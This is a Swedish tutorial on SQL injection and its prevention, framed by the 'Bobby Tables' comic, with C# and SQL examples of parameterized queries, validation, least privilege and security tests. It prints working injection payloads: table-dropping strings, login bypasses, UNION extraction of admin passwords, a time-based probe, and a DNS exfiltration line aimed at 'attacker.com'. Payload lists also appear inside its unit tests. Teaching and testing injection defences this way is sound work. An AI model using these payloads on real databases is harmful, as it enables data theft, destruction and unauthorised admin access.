# SQL-säkerhet och Bobby Tables

🟢


SQL-säkerhet är kritiskt för alla databasdrivna applikationer. Den mest kända och farliga sårbarheten är SQL Injection, populariserad genom XKCD-serien "Bobby Tables". Denna attack kan ge angripare fullständig kontroll över databaser, vilket gör förståelse för SQL-säkerhet absolut nödvändigt för alla utvecklare som arbetar med databaser.

## Innehållsförteckning

- [Introduktion](#introduktion)
- [Bobby Tables - Den klassiska SQL Injection](#bobby-tables---den-klassiska-sql-injection)
- [Hur SQL Injection fungerar](#hur-sql-injection-fungerar)
- [Typer av SQL Injection](#typer-av-sql-injection)
- [Förebyggande åtgärder](#förebyggande-åtgärder)
- [Parameteriserade frågor](#parameteriserade-frågor)
- [Input-validering](#input-validering)
- [Minsta behörighetsprincipen](#minsta-behörighetsprincipen)
- [Andra säkerhetsaspekter](#andra-säkerhetsaspekter)
- [Säkra utvecklingsmetoder](#säkra-utvecklingsmetoder)
- [Praktiska exempel](#praktiska-exempel)
- [Testning av säkerhet](#testning-av-säkerhet)
- [Slutsats](#slutsats)
- [TL;DR](#tldr)

## Introduktion

SQL Injection är en av de vanligaste och farligaste webbsårbarheterna. Den uppstår när användareninput inte valideras ordentligt innan den inkluderas i SQL-frågor. Detta kan leda till att angripare kan manipulera databaser, stjäla känslig information, eller till och med ta över hela system.

XKCD-serien #327 "Exploits of a Mom" introducerade världen för "Bobby Tables" - en elev vars namn var en SQL Injection-attack som raderade skolans databas. Denna humoristiska illustration har blivit en klassiker inom cybersäkerhet och illustrerar perfekt vikten av säker programmering.

## Bobby Tables - Den klassiska SQL Injection

### XKCD #327 förklarad

```
Elevens namn: Robert'); DROP TABLE Students;--
```

När detta namn matas in i en osäker SQL-fråga:

```sql
-- Osäker kod som skolan använde
SELECT * FROM Students WHERE name = 'Robert'); DROP TABLE Students;--'
```

Resultatet blev:

1. `SELECT * FROM Students WHERE name = 'Robert')` - Hämtar eleven Robert
2. `DROP TABLE Students;` - **RADERAR HELA TABELLEN!**
3. `--'` - Kommenterar bort resten av frågan

### Verklighetens konsekvenser

Bobby Tables-attacker har orsakat:

- Dataförluster värt miljoner dollar
- Stulna kreditkortsuppgifter
- Kompromettering av användarinformation
- Nedstängning av tjänster
- Juridiska konsekvenser för företag

## Hur SQL Injection fungerar

### Grundläggande princip

SQL Injection utnyttjar bristfällig separering mellan kod och data:

```sql
-- Utvecklaren tänker sig detta
SELECT * FROM Users WHERE username = 'alice' AND password = 'secret123'

-- Men angriparen kan mata in detta som lösenord: ' OR '1'='1
-- Vilket resulterar i
SELECT * FROM Users WHERE username = 'alice' AND password = '' OR '1'='1'
-- Eftersom '1'='1' alltid är sant, loggas användaren in!
```

### Steg-för-steg exempel

1. **Osäker kod** (gör ALDRIG så här):

```csharp
string username = userInput;
string query = "SELECT * FROM Users WHERE Username = '" + username + "'";
```

2. **Normal användning**:

```
Input: alice
Resultat: SELECT * FROM Users WHERE Username = 'alice'
```

3. **Skadlig användning**:

```
Input: alice'; DROP TABLE Users; --
Resultat:
SELECT * FROM Users WHERE Username = 'alice';
DROP TABLE Users;
--'
```

## Typer av SQL Injection

### 1. In-band SQL Injection

Angriparen får svar direkt genom samma kanal:

```sql
-- Union-based
' UNION SELECT username, password FROM admin_users --

-- Error-based
' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
```

### 2. Blind SQL Injection

Angriparen får inget direkt svar men kan dra slutsatser:

```sql
-- Boolean-based
' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 8 --

-- Time-based
'; WAITFOR DELAY '00:00:05' --
```

### 3. Out-of-band SQL Injection

Data extraheras genom andra kanaler (DNS, HTTP):

```sql
-- Exfiltrera data via DNS
'; EXEC xp_dirtree '\\' + (SELECT password FROM users WHERE id=1) + '.attacker.com\share' --
```

## Förebyggande åtgärder

### 1. Parameteriserade frågor (Primary Defense)

**C# med SqlCommand:**

```csharp
// SÄKERT - Parameteriserad fråga
string sql = "SELECT * FROM Users WHERE Username = @username AND Password = @password";
using (SqlCommand cmd = new SqlCommand(sql, connection))
{
    cmd.Parameters.AddWithValue("@username", username);
    cmd.Parameters.AddWithValue("@password", password);
    // Kör frågan säkert
}
```

**SQLite med System.Data.SQLite:**

```csharp
// SÄKERT - SQLite parametrar
string sql = "INSERT INTO Users (Username, Email) VALUES (?, ?)";
using (SQLiteCommand cmd = new SQLiteCommand(sql, connection))
{
    cmd.Parameters.Add(new SQLiteParameter(DbType.String, username));
    cmd.Parameters.Add(new SQLiteParameter(DbType.String, email));
    cmd.ExecuteNonQuery();
}
```

### 2. Stored Procedures

```sql
-- Skapa säker stored procedure
CREATE PROCEDURE GetUserByCredentials
    @Username NVARCHAR(50),
    @Password NVARCHAR(100)
AS
BEGIN
    SELECT UserId, Username, Email
    FROM Users
    WHERE Username = @Username AND PasswordHash = @Password
END
```

```csharp
// Anropa stored procedure från C#
using (SqlCommand cmd = new SqlCommand("GetUserByCredentials", connection))
{
    cmd.CommandType = CommandType.StoredProcedure;
    cmd.Parameters.AddWithValue("@Username", username);
    cmd.Parameters.AddWithValue("@Password", hashedPassword);
    // Kör säkert
}
```

### 3. ORM (Object-Relational Mapping)

```csharp
// Entity Framework - automatiskt säkert
var user = context.Users
    .Where(u => u.Username == username && u.Password == password)
    .FirstOrDefault();

// Dapper med parametrar
var user = connection.QueryFirstOrDefault<User>(
    "SELECT * FROM Users WHERE Username = @Username AND Password = @Password",
    new { Username = username, Password = password });
```

## Parameteriserade frågor

### Varför parametrar fungerar

Parametrar separerar SQL-kod från data:

```csharp
// Osäkert - Strängkoncatenering
string sql = "SELECT * FROM Products WHERE Category = '" + category + "'";

// Säkert - Parameter
string sql = "SELECT * FROM Products WHERE Category = @category";
cmd.Parameters.AddWithValue("@category", category);
```

### Olika typer av parametrar

```csharp
// Named parameters (.NET)
cmd.Parameters.AddWithValue("@name", "Robert'); DROP TABLE Students;--");

// Positional parameters
cmd.Parameters.Add("?", DbType.String).Value = userInput;

// Strongly typed parameters
cmd.Parameters.Add(new SqlParameter("@age", SqlDbType.Int) { Value = age });
```

### Vanliga misstag med parametrar

```csharp
// FELAKTIGT - Fortfarande osäkert!
string sql = $"SELECT * FROM Users WHERE Username = @username AND Role = '{role}'";
// Problemet: 'role' är inte parameteriserad

// KORREKT - Alla värden parameteriserade
string sql = "SELECT * FROM Users WHERE Username = @username AND Role = @role";
cmd.Parameters.AddWithValue("@username", username);
cmd.Parameters.AddWithValue("@role", role);
```

## Input-validering

### Whitelist-baserad validering

```csharp
public bool IsValidUsername(string username)
{
    // Endast alfanumeriska tecken och underscore
    return Regex.IsMatch(username, @"^[a-zA-Z0-9_]+$") && username.Length <= 50;
}

public bool IsValidEmail(string email)
{
    try
    {
        var addr = new MailAddress(email);
        return addr.Address == email;
    }
    catch
    {
        return false;
    }
}
```

### Längdbegränsningar

```csharp
public string SanitizeInput(string input, int maxLength)
{
    if (string.IsNullOrEmpty(input))
        return string.Empty;

    // Begränsa längd
    if (input.Length > maxLength)
        input = input.Substring(0, maxLength);

    // Ta bort farliga tecken (men parameterisering är bättre!)
    return input.Replace("'", "''").Replace(";", "").Replace("--", "");
}
```

### Datatypsvalidering

```csharp
public bool ValidateAndParseInt(string input, out int result)
{
    result = 0;
    if (string.IsNullOrWhiteSpace(input))
        return false;

    return int.TryParse(input, out result) && result >= 0;
}
```

## Minsta behörighetsprincipen

### Databasanvändare med begränsade rättigheter

```sql
-- Skapa applikationsanvändare med minimala rättigheter
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_random_password';

-- Ge endast nödvändiga rättigheter
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'app_user'@'localhost';
GRANT SELECT, INSERT ON myapp.orders TO 'app_user'@'localhost';
GRANT SELECT ON myapp.products TO 'app_user'@'localhost';

-- Neka farliga rättigheter
-- Ingen DROP, CREATE, ALTER, eller administrativa rättigheter
```

### Separata användare för olika funktioner

```sql
-- Read-only användare för rapporter
CREATE USER 'report_user'@'localhost' IDENTIFIED BY 'report_password';
GRANT SELECT ON myapp.* TO 'report_user'@'localhost';

-- Backup-användare
CREATE USER 'backup_user'@'localhost' IDENTIFIED BY 'backup_password';
GRANT SELECT, LOCK TABLES ON myapp.* TO 'backup_user'@'localhost';
```

## Andra säkerhetsaspekter

### 1. Lösenordshantering

```csharp
// Använd BCrypt för lösenordshashing
public string HashPassword(string password)
{
    return BCrypt.Net.BCrypt.HashPassword(password, 12); // Cost factor 12
}

public bool VerifyPassword(string password, string hash)
{
    return BCrypt.Net.BCrypt.Verify(password, hash);
}
```

### 2. Anslutningssträngar

```csharp
// Lagra anslutningssträngar säkert
// appsettings.json (krypterad i produktion)
{
    "ConnectionStrings": {
        "DefaultConnection": "Data Source=localhost;Initial Catalog=MyApp;Integrated Security=true;Encrypt=true;TrustServerCertificate=false"
    }
}

// Använd konfiguration
var connectionString = configuration.GetConnectionString("DefaultConnection");
```

### 3. Loggning av säkerhetshändelser

```csharp
public class SecurityLogger
{
    private readonly ILogger<SecurityLogger> _logger;

    public void LogSqlInjectionAttempt(string userInput, string ipAddress)
    {
        _logger.LogWarning("Possible SQL injection attempt from {IpAddress}: {Input}",
            ipAddress, userInput);
    }

    public void LogFailedLogin(string username, string ipAddress)
    {
        _logger.LogWarning("Failed login attempt for {Username} from {IpAddress}",
            username, ipAddress);
    }
}
```

## Säkra utvecklingsmetoder

### 1. Code Review

```csharp
// Checklist för code review:
// ✓ Används parameteriserade frågor?
// ✓ Valideras all input?
// ✓ Finns det strängkoncatenering i SQL?
// ✓ Används minsta behörighetsprincipen?

// FLAGGA DETTA i code review:
string sql = "SELECT * FROM Users WHERE Id = " + userId; // FARLIGT!

// GODKÄNN DETTA:
string sql = "SELECT * FROM Users WHERE Id = @userId";
cmd.Parameters.AddWithValue("@userId", userId);
```

### 2. Automatiserade säkerhetstester

```csharp
[Test]
public void TestSqlInjectionPrevention()
{
    // Testa med kända SQL injection-strängar
    string[] maliciousInputs = {
        "'; DROP TABLE Users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM admin --",
        "Robert'); DROP TABLE Students;--"
    };

    foreach (string input in maliciousInputs)
    {
        // Verifiera att applikationen hanterar detta säkert
        Assert.DoesNotThrow(() => userService.GetUserByName(input));
        // Verifiera att ingen skadlig kod körs
        Assert.That(GetTableCount("Users"), Is.GreaterThan(0));
    }
}
```

## Praktiska exempel

### Osäker vs Säker implementering

```csharp
// OSÄKER IMPLEMENTERING - Gör ALDRIG så här!
public class UnsafeUserService
{
    public User GetUser(string username, string password)
    {
        string sql = $"SELECT * FROM Users WHERE Username = '{username}' AND Password = '{password}'";
        // Detta är extremt farligt!
        return database.Query<User>(sql).FirstOrDefault();
    }

    public void DeleteUser(string userId)
    {
        string sql = "DELETE FROM Users WHERE Id = " + userId;
        // Även detta är farligt!
        database.Execute(sql);
    }
}

// SÄKER IMPLEMENTERING - Gör så här istället!
public class SafeUserService
{
    public User GetUser(string username, string password)
    {
        string sql = "SELECT * FROM Users WHERE Username = @username AND PasswordHash = @passwordHash";
        var passwordHash = HashPassword(password);

        return database.Query<User>(sql, new {
            username = username,
            passwordHash = passwordHash
        }).FirstOrDefault();
    }

    public void DeleteUser(int userId)
    {
        string sql = "DELETE FROM Users WHERE Id = @userId";
        database.Execute(sql, new { userId = userId });
    }

    private string HashPassword(string password)
    {
        return BCrypt.Net.BCrypt.HashPassword(password, 12);
    }
}
```

### Hantering av Bobby Tables-scenariot

```csharp
public class SchoolManagementSystem
{
    // Så här skulle Bobby Tables-attacken se ut
    public void EnrollStudent(string studentName)
    {
        // OSÄKERT - Detta skulle radera tabellen!
        // string sql = $"INSERT INTO Students (Name) VALUES ('{studentName}')";

        // SÄKERT - Parameteriserad fråga
        string sql = "INSERT INTO Students (Name) VALUES (@name)";

        using (var cmd = new SQLiteCommand(sql, connection))
        {
            cmd.Parameters.AddWithValue("@name", studentName);

            try
            {
                cmd.ExecuteNonQuery();
                Console.WriteLine($"Student {studentName} enrolled successfully");
            }
            catch (Exception ex)
            {
                // Logga felet utan att exponera känslig information
                logger.LogError("Failed to enroll student: {Error}", ex.Message);
                throw new ApplicationException("Failed to enroll student");
            }
        }
    }

    // Demonstration av vad som skulle hända
    public void DemonstrateAttack()
    {
        string bobbytables = "Robert'); DROP TABLE Students;--";

        // Med säker implementering:
        EnrollStudent(bobbytables);
        // Resultat: En student med det konstiga namnet läggs till
        // Inga tabeller raderas!
    }
}
```

### Säker sökning med wildcards

```csharp
public class ProductSearchService
{
    public List<Product> SearchProducts(string searchTerm)
    {
        // Säkert sätt att hantera wildcards
        string sql = "SELECT * FROM Products WHERE ProductName LIKE @searchTerm";

        // Säkert sätt att lägga till wildcards
        string safeSearchTerm = "%" + searchTerm.Replace("%", "[%]").Replace("_", "[_]") + "%";

        return database.Query<Product>(sql, new { searchTerm = safeSearchTerm }).ToList();
    }
}
```

## Testning av säkerhet

### Manual testing

```csharp
// Testa med kända SQL injection-strängar
public class SecurityTestData
{
    public static readonly string[] SqlInjectionPayloads = {
        "'; DROP TABLE Users; --",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "'; INSERT INTO Users (Username, IsAdmin) VALUES ('hacker', 1); --",
        "' UNION SELECT username, password FROM admin_users --",
        "Robert'); DROP TABLE Students;--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        "'; WAITFOR DELAY '00:00:05' --"
    };
}

[Test]
public void TestAllInputFieldsAgainstSqlInjection()
{
    foreach (string payload in SecurityTestData.SqlInjectionPayloads)
    {
        // Testa alla input-fält
        Assert.DoesNotThrow(() => userService.Login(payload, "password"));
        Assert.DoesNotThrow(() => userService.Register(payload, "email@test.com"));
        Assert.DoesNotThrow(() => productService.Search(payload));

        // Verifiera att databasen är intakt
        Assert.That(GetTableExists("Users"), Is.True);
        Assert.That(GetTableExists("Products"), Is.True);
    }
}
```

### Automated security scanning

```csharp
// Integration med säkerhetsverktyg
public class SecurityScanningTests
{
    [Test]
    public void RunSqlMapScan()
    {
        // Konfigurera SQLMap eller liknande verktyg
        // för att automatiskt testa SQL injection
    }

    [Test]
    public void RunOWASPZAPScan()
    {
        // Integrera med OWASP ZAP för säkerhetstestning
    }
}
```

## Slutsats

SQL Injection, exemplifierat av den berömda Bobby Tables-attacken, förblir en av de allvarligaste hoten mot webbapplikationer. Genom att konsekvent använda parameteriserade frågor, validera input, tillämpa minsta behörighetsprincipen och implementera säkra utvecklingsmetoder kan utvecklare effektivt skydda sina applikationer. Kom ihåg: säkerhet är inte en engångsinsats utan en kontinuerlig process som måste integreras i hela utvecklingscykeln.

## TL;DR

**Bobby Tables** = SQL Injection attack där `Robert'); DROP TABLE Students;--` raderar databastabeller när namn matas in osäkert. **SQL Injection** uppstår när användarinput concateneras direkt i SQL-strängar istället för att använda parametrar. **Lösning**: Använd ALLTID parameteriserade frågor (`@parameter` i C#) - ALDRIG strängkoncatenering. **Andra skydd**: Input-validering, minimal databasrättigheter, lösenordshashing (BCrypt), säker anslutningsstränghantering. **Testa**: Kör säkerhetstester med kända injection-strängar. **Kom ihåg**: `string sql = "SELECT * FROM Users WHERE name = '" + input + "'"` = FARLIGT! `string sql = "SELECT * FROM Users WHERE name = @name"` = SÄKERT!

Exempel: parameteriserad INSERT i C#

```csharp
using var conn = new SQLiteConnection("Data Source=app.db");
conn.Open();
using var cmd = new SQLiteCommand("INSERT INTO Users (Username, PasswordHash) VALUES (@u, @p)", conn);
cmd.Parameters.AddWithValue("@u", username);
cmd.Parameters.AddWithValue("@p", passwordHash); // hashat med bcrypt/PBKDF2
cmd.ExecuteNonQuery();
```

Hashing rekommendation

- Använd bcrypt/Argon2/PBKDF2 med salt — aldrig eget hemmabygge.
- Spara bara salt + hash (inte råa lösenord).

---
Sådärja. Nu har du koll på det här. Nästa steg — testa själv. Det är då det fastnar.
